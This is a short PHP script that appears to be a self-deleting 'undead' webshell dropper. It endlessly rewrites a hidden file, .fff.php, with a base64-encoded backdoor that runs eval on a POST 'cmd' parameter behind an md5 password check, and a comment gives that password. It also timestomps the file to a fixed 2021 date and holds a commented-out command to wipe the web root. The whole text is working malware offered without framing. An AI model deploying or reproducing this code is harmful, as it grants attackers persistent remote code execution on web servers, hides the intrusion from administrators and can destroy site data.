<?php 
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = './.fff.php';
    $code = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFsncGFzcyddKT09JzVkYTc4MTcwYTIwNzc4M2EwOWUxNzlkNDg4ZjRhOWMzJylAZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==');
    //pass=pass
    while (1){
        if(md5(file_get_contents($file))!==md5($code)) {
            file_put_contents($file, $code);
        }
        system('touch -m -d "2021-12-01 09:10:12" ' . $file);
        #system("rm -rf /var/www/html/* !(.fff.php)");
        usleep(100);
    }
?>
